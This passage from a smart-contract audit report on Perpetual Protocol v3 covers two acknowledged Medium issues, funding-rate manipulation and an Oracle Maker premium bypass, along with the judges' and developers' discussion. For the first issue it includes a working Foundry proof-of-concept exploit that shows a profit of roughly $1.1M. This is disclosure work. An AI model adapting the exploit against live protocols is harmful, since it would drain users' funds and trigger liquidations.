>  this seem valid medium to me due the likelihood and the admin intervention part which will definetly raise am alarm; medium(1)



**42bchen**

Update: The funding fee can't be reversed in this assumption because the sign of the funding is based on the position direction that OracleMaker holds. It can only change the fundingRateAbs. Also, I think the severity of this problem is at most medium.

# Issue M-11: Funding Fee Rate is calculated based only on the Oracle Maker's skew but applied across the entire market, which enables an attacker to generate an extreme funding rate for a low cost and leverage that to their benefit 

Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133 

The protocol has acknowledged this issue.

## Found by 
ge6a, ihavebigmuscle, joicygiore, nirohgo
## Summary

The fact that the Funding Fee rate is calculated only based on the Oracle Maker's position skew enables an exploiter to open a large long position on the Oracle Maker that generates an extreme funding fee paid by long takers, and then close the position (+open an opposite one) on the SpotHedge maker within the same block while maintaining the funding fee value and direction. This can be used to generate various attacks as detailed below.

## Vulnerability Detail

Perpetual uses funding fee to balance between long and short positions, mainly to balance/reduce exposure of the Oracle Maker (from the docs: *"In our system, having a funding fee will be beneficial for the Oracle Pool"*. Presumably for this reason the funding rate is calculated based only on the Oracle Maker's position skew as can be seen in this code snippet taken from the getCurrentFundingRate function (note that basePool is neccesarily the Oracle Maker since it is type-casted to OracleMaker in the code):
```solidity
        // we can only use margin without pendingMargin as totalDepositedAmount
        // since pendingMargin includes pending borrowingFee and fundingFee,
        // it will be infinite loop dependency
        uint256 totalDepositedAmount = uint256(_getVault().getSettledMargin(marketId, fundingConfig.basePool));
        uint256 maxCapacity = FixedPointMathLib.divWad(
            totalDepositedAmount,
            uint256(OracleMaker(fundingConfig.basePool).minMarginRatio())
        );
```
However, the funding fee applies to **any position** in the market (as can be seen in the [Vault::settlePosition](https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/src/vault/Vault.sol#L139) function) which enables an exploiter to create a very high funding rate for a low cost by opening a large long position on the oracle maker and close the position immediately after on the HSBM maker (possibly also opening a short depending on the type of attack).  Since the opposite position does not affect the funding rate (as it is settled with the SpotHedge maker), the funding rate will maintain its extreme value and its direction. 

This maneuver can generate multiple types of attacks that can be conducted individually or combined:  

**A. Griefing/Liquidation attack** - The attacker creates an extreme funding rate that causes immediate loss to position holders of the attacked direction, possibly making many positions liquidatable on the next block. This attack is conducted as follows:  
A.1. Attacker opens a maximal long position on the oracle maker creating an extremely high funding rate paid by longs.
A.2. Attacker closes their long position using the HSBM maker. This means the extreme high funding rate is unaffected since its calculated based on the oracle maker only. (A1 and A2 can be done in an atomic transaction from an attacker contract).  
A.3. Starting from the next block any long position in the system incures a very high cost per block, likely making many positions liquidatable immediately.  
A.4. The cost for the attacker is only the negative PnL caused by the spread between the oracle and HSBM makers. The attacker can offset the cost and make a profit by running a transaction at the start of the next block that liquidates all positions that were liquidated by the move (the attacker has information advantage over other liquidators and are likely to win the liquidations).  

**B. Profiting from large funding fee within one block by also opening a short (exfiltrating funds from the PnL pool).**  
B.1. the attack starts similarly to A: the attacker opens a maximal long position on the OM and then a counter short position on the HSBM maker, only this time the attacker also opens a short on the SpotHedge maker that gains the attacker funding fees starting from the next block.  
B.2. The attacker can close the short position at the start of the next block to reduce risk, taking profit from the fee paid for the one block, in addition to liquidating any affected positions as in scenario A.  
B.3. The cost of attack: negative PnL caused by spread between the two makers, plus borrowing fee. However because borrowing fee does not grow exponentially with utilization rate like the funding fee, it is covered by the funding fee with a profit.

**C. Profiting from a large deposit to the oracle maker/withdraw within one block.**  
C.1.  The attack runs the same as scenario A, only the attacker also makes a large deposit to the oracle maker, and withdraws on the next block.  
C.2. Since share values take into account pending fees, the share value will increase significantly from one block to the next because the oracle maker will also get a high funding fee within that one block (this is because oracle maker also holds a large short position as a result of the attackers initial postion, that gets paid funding fee). Note that in this scenarion the attacker needs to verify that there is no expected loss to share value between these two blocks




The POC below shows how with reasonable market considitions the attacker can make a significant profit, specifically using only attack type B.



### POC
The following POC shows the scenario where the attacker generates a high funding rate paid by longs, while opening a large short position for themselves, then on the next block the attacker closes the short with a significant gain from funding fee (while the HSBM maker pays the funding fee)

To run:  
A. create a test.sol file under the perp-contract-v3/test/spotHedgeMaker/ folder and add the code below to it.
B. Run forge test --match-test testFundingFeePOC -vv

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../spotHedgeMaker/SpotHedgeBaseMakerForkSetup.sol";
import { OracleMaker } from "../../src/maker/OracleMaker.sol";
import "../../src/common/LibFormatter.sol";
import { SignedMath } from "@openzeppelin/contracts/utils/math/SignedMath.sol";

contract FundingFeeExploit is SpotHedgeBaseMakerForkSetup {

    using LibFormatter for int256;
    using LibFormatter for uint256;
    using SignedMath for int256;

    address public taker = makeAddr("Taker");
    address public exploiter = makeAddr("Exploiter");
    OracleMaker public oracle_maker;

    function setUp() public override {
        super.setUp();
        //create oracle maker
        oracle_maker = new OracleMaker();
        _enableInitialize(address(oracle_maker));
        oracle_maker.initialize(marketId, "OM", "OM", address(addressManager), priceFeedId, 1e18);
        config.registerMaker(marketId, address(oracle_maker));

        //PARAMETERS SETUP

        //fee setup
        //funding fee configs (taken from team tests) 
        config.setFundingConfig(marketId, 0.005e18, 1.3e18, address(oracle_maker));
        //borrowing fee 0.00000001 per second as in team tests
        config.setMaxBorrowingFeeRate(marketId, 10000000000, 10000000000);
        oracle_maker.setMaxSpreadRatio(0.1 ether); // 10% as in team tests
        

        //whitelist users
        oracle_maker.setValidSender(exploiter,true);
        oracle_maker.setValidSender(taker,true);
        

        //add more liquidity ($20M) to uniswap pool to simulate realistic slippage
        deal(address(baseToken), spotLp, 10000e9, true);
        deal(address(collateralToken), spotLp, 20000000e6, true);
        vm.startPrank(spotLp);
        uniswapV3NonfungiblePositionManager.mint(
            INonfungiblePositionManager.MintParams({
                token0: address(collateralToken),
                token1: address(baseToken),
                fee: 3000,
                tickLower: -887220,
                tickUpper: 887220,
                amount0Desired: collateralToken.balanceOf(spotLp),
                amount1Desired: baseToken.balanceOf(spotLp),
                amount0Min: 0,
                amount1Min: 0,
                recipient: spotLp,
                deadline: block.timestamp
            })
        );
 

        //mock the pyth price to be same as uniswap (set to ~$2000 in base class)
        pyth = IPyth(0xff1a0f4744e8582DF1aE09D5611b887B6a12925C);
        _mockPythPrice(2000,0);
    }


    function testFundingFeePOC() public {
       

        //deposit 5M collateral as margin for exploiter (also mints the amount)
        uint256 startQuote = 5000000*1e6;
       _deposit(marketId, exploiter, startQuote);
       console.log("Exploiter Quote balance at Start: %s\n", startQuote);

        //deposit to makers
        //initial HSBM maker deposit: 2000 base tokens ($4M)
       vm.startPrank(makerLp);
       deal(address(baseToken), makerLp, 2000*1e9, true);
       baseToken.approve(address(maker), type(uint256).max);
       maker.deposit(2000*1e9);

       //initial oracle maker deposit: $2M (1000 base tokens)
       deal(address(collateralToken), makerLp, 2000000*1e6, true); 
       collateralToken.approve(address(oracle_maker), type(uint256).max);
       oracle_maker.deposit(2000000*1e6);
       vm.stopPrank();

       //Also deposit collateral directly to SHBM to simulate some existing margin on the SHBM from previous activity
       _deposit(marketId, address(maker), 2000000*1e6);

       //Exploiter opens the maximum possible (-1000 base tokens) long on oracle maker
        vm.startPrank(exploiter);
        (int256 posBase, int256 openNotional) = clearingHouse.openPosition(
            IClearingHouse.OpenPositionParams({
                marketId: marketId,
                maker: address(oracle_maker),
                isBaseToQuote: false,
                isExactInput: false,
                amount: 1000*1e18,
                oppositeAmountBound:type(uint256).max,
                deadline: block.timestamp,
                makerData: ""
            })
        );

        //Exploiter opens maximum possible short on the HSBM maker changing their position to short 1000 (2000-1000)
        (posBase,openNotional) = clearingHouse.openPosition(
            IClearingHouse.OpenPositionParams({
                marketId: marketId,
                maker: address(maker),
                isBaseToQuote: true,
                isExactInput: true,
                amount: 2000 * 1e18,
                oppositeAmountBound:0,
                deadline: block.timestamp,
                makerData: ""
            })
        );
        console.log("Funding Fee Rate after short:");
        int256 ffeeRate = fundingFee.getCurrentFundingRate(marketId);
        console.logInt(ffeeRate);
        //OUTPUT:
        // Funding Fee Rate after short:
        //-388399804857866884

        //move to next block
        vm.warp(block.timestamp + 2 seconds);

        //Exploiter closes the short to realize gains
        int256 exploiterPosSize = vault.getPositionSize(marketId,address(exploiter));
        clearingHouse.openPosition(
            IClearingHouse.OpenPositionParams({
                marketId: marketId,
                maker: address(maker),
                isBaseToQuote: false,
                isExactInput: false,
                amount: exploiterPosSize.abs(),
                oppositeAmountBound:type(uint256).max,
                deadline: block.timestamp,
                makerData: ""
            })
        );

        //exploiter withdraws entirely
        int256 upDec = vault.getUnsettledPnl(marketId,address(exploiter));
        int256 stDec = vault.getSettledMargin(marketId,address(exploiter));
        int256 marg = stDec-upDec;
        uint256 margAbs = marg.abs();
        uint256 toWithdraw = margAbs.formatDecimals(INTERNAL_DECIMALS,collateralToken.decimals());
        vault.transferMarginToFund(marketId,toWithdraw);
        vault.withdraw(vault.getFund(exploiter));
        vm.stopPrank();

        uint256 finalQuoteBalance = collateralToken.balanceOf(address(exploiter));
        console.log("Exploiter Quote balance at End: %s", finalQuoteBalance);
        //OUTPUT: Exploiter Quote balance at End: 6098860645835
        //exploiter profit  = $6,098,860 - $5,000,000 = $1,098,860
    }
}

```


## Impact

The various possible attacks detailed above generate immediate profits to the exploiter that can be withdrawn immediately if enough PnL exists in the pool, diluting the PnL pool on the expense of users and causing them financial loss from not being able to withdraw their profits. In addition, as detailed above many positions can be made liquidatable following the attack causing further damage.

## Code Snippet
https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/src/fundingFee/FundingFee.sol#L104

## Tool used

Manual Review
Foundry

## Recommendations

To mitigate this issue it is essential to resolve the root cause: the fact that funding fee is set using only a part of the market (Oracle Maker). Instead, the entire market long/short positions should be used to determine the rate. This will prevent an exploiter from opening the counter position (that gains fee) without that position also affecting the funding rate.



## Discussion

**sherlock-admin4**

2 comment(s) were left on this issue during the judging contest.

**santipu_** commented:
> Medium

**takarez** commented:
>  seem to be a dupp of 125 due to large deposit and the recommendation also; high(4)



**vinta**

Confirmed, valid! Thank you for reporting this issue!

**paco0x**

If an attacker intentionally open position to make the Oracle Maker imbalanced and close position on SpotHedge maker. The cost of this action is the maker swap fees (we'll have swap fees in later update).

We expect there'll be two kinds arbitrageurs come in to help balance Oracle Maker's position.

1. The slippage of Oracle Maker becomes a positive premium when helping balance Oracle Maker, so arbitrageurs can open reverse position on SpotHedge maker and close on Oracle Maker and earn the premium right away.

2. Arbitrageurs who're willing to earn funding fees can take over Oracle Maker's position and hedge the position else where, while receiving the funding fee.

In my opinion, this one is a medium and we might not fix it in the near future.

# Issue M-12: Incorrect premium calculation in OracleMaker 

Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/137 

The protocol has acknowledged this issue.

## Found by 
jokr
## Summary
 Position rate should not be influenced by free collateral of the OracleMaker

## Vulnerability Detail
Position rate determines the exposure of OracleMaker. Position rate is used to determine the amount of premium based on the current oracleMaker position. 

For ex: If maker has 100 ETH long position and if a user wants to open a short then the price which he has to open will be less than actual market price. If user takes the long, then its in favour of oracleMaker, so no premium will be imposed 

Here is how the position rate is being calculated

```solidity
    function _getPositionRate(uint256 price) internal view returns (int256) {
        IVault vault = _getVault();
        uint256 marketId_ = _getOracleMakerStorage().marketId;
        // accountValue = margin + unrealisedPnl
        int256 accountValue = vault.getAccountValue(marketId_, address(this), price);
        int256 unrealizedPnl = vault.getUnrealizedPnl(marketId_, address(this), price);
        int256 unsettledMargin = accountValue - unrealizedPnl;
        int256 collateralForOpen = FixedPointMathLib.min(unsettledMargin, accountValue);
        // TODO: use positionMarginRequirement
        //int256 collateralForOpen = positionMarginRequirement + freeCollateralForOpen;
        if (collateralForOpen <= 0) {
            revert LibError.NegativeOrZeroMargin();
        }

        int256 maxPositionNotional = (collateralForOpen * 1 ether) / _getOracleMakerStorage().minMarginRatio.toInt256();

        // if maker has long position, positionRate > 0
        // if maker has short position, positionRate < 0
        int256 openNotional = vault.getOpenNotional(marketId_, address(this));
        int256 uncappedPositionRate = (-openNotional * 1 ether) / maxPositionNotional;

        // util ratio: 0 ~ 1
        // position rate: -1 ~ 1
        return
            uncappedPositionRate > 0
                ? FixedPointMathLib.min(uncappedPositionRate, 1 ether)
                : FixedPointMathLib.max(uncappedPositionRate, -1 ether);
    }

```
The problem here is the `uncappedPositionRate` also depends on `maxPositionNotional`. `maxPositionNotional` is the maximum openNotional possible for current `openCollateral` of oracleMaker with given `minMarginRatio`.

`int256 uncappedPositionRate = (-openNotional * 1 ether) / maxPositionNotional;`

So in this case if the `freeCollateral` is more in the oracle maker than the premium becomes proportionally low which is not correct.

Consider this scenario
 Currently oracleMaker has 100 ETH short position. If a user wants to take a 10 ETH long position there must premium against user. So the reservation price at which user opens will be higher than market price. 
 
Now the user deposits large amount of collateral as LP. As the. freeCollateral increases, for sufficient collateral  given the premium free decreases proportionally. After the user opens the position with less premium, he just withdraws the collateral back. Thus bypassing the premium enforced by oracle maker

This is possible by considering free collateral while calculating the position rate. Position rate should solely depend on openNotional and not on free collateral in any way

## Impact
Incorrect handling of risk exposure 

## Code Snippet

https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/OracleMaker.sol#L411

## Tool used

Manual Review

## Recommendation

Modify the position rate calculation by excluding `maxPositionNotional`



## Discussion

**sherlock-admin3**

1 comment(s) were left on this issue during the judging contest.

**santipu_** commented:
> Medium



**rc56**

@CheshireCatNick
- Won't fix for now. Will improve in the future. One potential solution is to implement a time lock when deposit / withdraw into makers.
- It is true that the trick (deposit -> open position -> withdraw) could bypass OracleMaker's spread, but the impact is considered a degradation (high risk exposure without proper compensation) of maker performance instead of a critical vulnerability.
- Also, oracle maker requires order being delayed. Attacker cannot deposit, open position and withdraw in the same tx. Thus, this attack is not completely risk-free.
- Note the maker has minMarginRatio which protects it from taking too much exposure. The parameter had been set conservative (minMarginRatio = 100%) from the start so we have extra safety margin to observe its real-world performance and improve it iteratively.

**CheshireCatNick**

Also in the beginning we only allow whitelisted users to deposit to maker.

**IllIllI000**

@rc56, @CheshireCatNick, and @42bchen if you disagree that this is a High, can you let us know what severity you think this should be, and apply the disagree-with-severity tag? It seems similar to https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/127 in that the LP deposits/withdrawals can be used to game what users have to pay

